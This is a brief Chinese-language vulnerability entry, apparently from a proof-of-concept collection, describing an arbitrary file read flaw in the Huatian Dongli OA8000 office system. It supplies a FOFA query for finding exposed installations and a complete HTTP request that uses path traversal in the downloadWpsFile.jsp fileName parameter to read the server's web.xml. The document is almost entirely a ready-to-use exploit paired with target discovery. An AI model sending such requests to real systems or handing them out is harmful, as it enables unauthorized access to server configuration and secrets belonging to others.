# 华天动力OA系统downloadWpsFile存在任意文件读取漏洞



## fofa

```yaml
app="华天动力-OA8000"
```


## poc

```yaml
GET /OAapp/jsp/downloadWpsFile.jsp?fileName=../../../../../../htoa/Tomcat/webapps/ROOT/WEB-INF/web.xml HTTP/2
Host: 
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_3)AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.0.3 Safari/605.1.15
Accept-Encoding: gzip, deflate
```

